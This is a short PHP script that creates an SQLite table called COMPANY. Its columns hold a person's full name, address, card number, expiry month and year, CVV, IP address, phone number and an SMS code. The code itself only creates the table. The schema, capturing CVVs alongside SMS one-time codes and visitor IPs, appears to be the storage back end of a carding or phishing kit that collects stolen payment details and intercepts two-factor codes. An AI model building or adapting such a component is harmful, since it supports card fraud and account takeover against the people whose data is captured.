<?php
   class MyDB extends SQLite3 {
      function __construct() {
         $this->open('../data.db');
      }
   }
   $db = new MyDB();
   if(!$db) {
      echo $db->lastErrorMsg();
   } else {
      echo "Opened database successfully\n";
   }

   $sql =<<<EOF
      CREATE TABLE COMPANY
      (
      ID INT PRIMARY KEY,
      Nomcomplet TEXT    ,
      Adresse TEXT,
      ZIP TEXT,
      Number TEXT,
      MM TEXT,
      AA TEXT,
      CVV TEXT,
      datee TEXT,
      timee TEXT,
      IP TEXT,
      smscode TEXT,
      TEL TEXT

      )
EOF;

   $ret = $db->exec($sql);
   if(!$ret){
      echo $db->lastErrorMsg();
   } else {
      echo "Table created successfully\n";
   }
   $db->close();
?>